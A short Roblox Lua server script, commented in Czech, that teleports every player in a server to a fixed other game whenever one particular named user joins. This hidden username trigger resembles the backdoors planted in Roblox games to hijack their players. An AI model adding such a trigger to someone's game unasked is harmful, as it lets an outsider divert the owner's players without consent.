local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- ID hry na kterou se má teleportovat
local targetPlaceId = 140233560440008

-- Funkce pro teleportaci všech hráčů
local function teleportPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        -- Teleportuj hráče na cílovou hru
        TeleportService:Teleport(targetPlaceId, player)
    end
end

-- Sledování připojení hráčů
Players.PlayerAdded:Connect(function(player)
    -- Když se připojí "TuBeRs93cs0"
    if player.Name == "TuBeRs93cs0" then
        -- Teleportuj všechny hráče na cílovou hru
        teleportPlayers()
    end
end)
